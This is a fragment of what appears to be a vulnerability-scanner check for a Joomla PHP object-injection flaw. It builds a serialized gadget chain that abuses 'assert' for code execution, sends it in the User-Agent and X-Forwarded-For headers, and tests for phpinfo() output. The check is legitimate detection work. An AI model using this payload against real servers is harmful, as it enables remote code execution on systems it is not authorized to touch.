...
ex_len = strlen( ex );
agent = "}__" + vtstrings["default"] + "|O:21:\"JDatabaseDriverMysqli\":3:{s:2:\"fc\";O:17:\"JSimplepieFactory\":0:{}s:21:\"" + "\\0\\0\\0" + "disconnectHandlers\";a:1:{i:0;a:2:{i:0;O:9:\"SimplePie\":5:{s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\"" + ":0:{}s:8:\"feed_url\";s:" + ex_len + ":\"" + ex + "\"" + ";s:19:\"cache_name_function\";s:6:\"assert\";s:5:\"cache\";b:1;s:11:\"cache_class\";O:20:\"JDatabaseDriverMysql\":0:{}}i:1;s:4:\"init\";}}s:13:\"" + "\\0\\0\\0" + "connection\";b:1;}";
agent += "\xf0\xfd\xfd\xfd";
injection = make_list( "User-Agent:",
	 "X-Forwarded-For:" );
...
for inj in injection {
	for(i = 0;i < 4;i++){
		...
		if(ContainsString( buf, "<title>phpinfo()</title>" )){
